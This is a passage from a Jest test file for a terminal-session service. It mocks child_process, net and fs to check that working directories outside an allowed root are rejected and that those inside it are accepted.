      // Re-register mocks for the fresh module import
      jest.doMock('child_process', () => ({
        execSync: jest.fn((cmd: string) => {
          if (typeof cmd === 'string' && cmd.startsWith('which ')) return '/usr/local/bin/mock\n';
          return '';
        }),
        execFileSync: jest.fn(),
        spawn: jest.fn(),
        ChildProcess: jest.fn(),
      }));
      jest.doMock('net', () => ({ createServer: jest.fn() }));
      jest.doMock('fs', () => ({ existsSync: jest.fn().mockReturnValue(false) }));

      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const { TerminalService: RestrictedSvc } = require('./terminal.service');
      const restricted = new RestrictedSvc();

      await expect(
        restricted.startSession('a1', '/tmp/outside'),
      ).rejects.toThrow('inside the allowed root');
    });

    it('accepts workdir inside allowed root', async () => {
      process.env.AGENT_WORKDIR_ROOT = '/allowed';
      jest.resetModules();

      const mockSrv = { once: jest.fn(), listen: jest.fn(), close: jest.fn() };
      mockSrv.once.mockImplementation((ev: string, cb: (...a: any[]) => void) => {
        if (ev === 'listening') setTimeout(() => cb(), 0);
        return mockSrv;
      });
      mockSrv.close.mockImplementation((cb: () => void) => cb());

      jest.doMock('child_process', () => {
        const proc = new EventEmitter() as any;
        proc.stdout = new EventEmitter();
        proc.stderr = new EventEmitter();
        proc.kill = jest.fn();
        return {
          execSync: jest.fn((cmd: string) => {
            if (typeof cmd === 'string' && cmd.startsWith('which ')) return '/usr/local/bin/mock\n';
            return '';
          }),
          execFileSync: jest.fn(),
          spawn: jest.fn().mockReturnValue(proc),
          ChildProcess: jest.fn(),
        };
      });
      jest.doMock('net', () => ({ createServer: jest.fn(() => mockSrv) }));
      jest.doMock('fs', () => ({ existsSync: jest.fn().mockReturnValue(false) }));

      // Mock fetch for waitForTtyd
      global.fetch = jest.fn().mockResolvedValue({ ok: true });

      // eslint-disable-next-line @typescript-eslint/no-require-imports
      const { TerminalService: RestrictedSvc } = require('./terminal.service');
      const restricted = new RestrictedSvc();

      // /allowed/subdir is inside /allowed → should pass
      const result = await restricted.startSession('a1', '/allowed/subdir');
      expect(result.port).toBe(7681);
    });
  });
});
